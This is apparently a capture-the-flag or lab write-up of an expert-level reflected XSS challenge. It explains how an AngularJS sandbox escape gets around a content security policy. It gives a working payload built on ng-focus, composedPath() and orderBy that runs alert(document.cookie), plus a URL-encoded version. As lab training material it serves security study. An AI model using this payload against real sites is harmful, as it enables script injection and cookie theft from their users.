
### Reflected XSS with AngularJS sandbox escape and CSP : EXPERT

---

> What happens here is that there is a CSP in place.
> To escape the angularjs sandbox, we need to use the `ng-focus` event that bypasses the CSP.

```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
```
> What this payload does is that it creates an input field with an id of x.
> And gives it the event property of focus, and a function z that holds the alert function, with the parameter `document.cookie`.
> In the end, it focuses to x using `#x` causing the event to trigger and the alert to fire.

> For it to properly work, we need to encode the angle brackets, spaces, and qoutes.
```
%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
```

---
